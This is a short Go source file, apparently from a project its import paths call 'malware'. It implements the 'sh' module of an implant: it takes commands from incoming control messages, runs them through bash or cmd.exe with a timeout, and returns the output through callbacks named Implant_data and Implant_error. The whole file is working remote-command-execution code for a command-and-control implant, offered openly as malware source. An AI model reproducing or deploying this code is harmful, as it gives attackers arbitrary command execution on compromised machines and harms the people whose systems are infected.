// +build !windows
package sh

import (
	"context"
	"malware/common/messages"
	"malware/common/types"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

/**
Takes a command and runs it in either bash or whatever windows calls bash
*/

type settings struct {
}

// Create creates an implementation of settings
func Create() types.Module {
	return settings{}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
	exe := message.GetExec()
	if exe == nil {
		return false
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) // 5 second timeout
	defer cancel()

	var cmd *exec.Cmd

	args := strings.Join(exe.Args, " ")

	// We run the commands under bash/cmd so that pipes will work
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", exe.Exec+" "+args)
	} else {
		cmd = exec.CommandContext(ctx, "bash", "-c", exe.Exec+" "+args)
	}

	out, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		callback(messages.Implant_error(settings.ID(), types.ERR_CMD_TIMEOUT))
	} else if err != nil {
		callback(messages.Implant_data(settings.ID(), []byte(err.Error())))
	} else {
		callback(messages.Implant_data(settings.ID(), out))
	}

	return true
}

// Init the state of this module
func (settings settings) Init() {
}
func (settings settings) Shutdown() {
}

func (settings) ID() string { return "sh" }
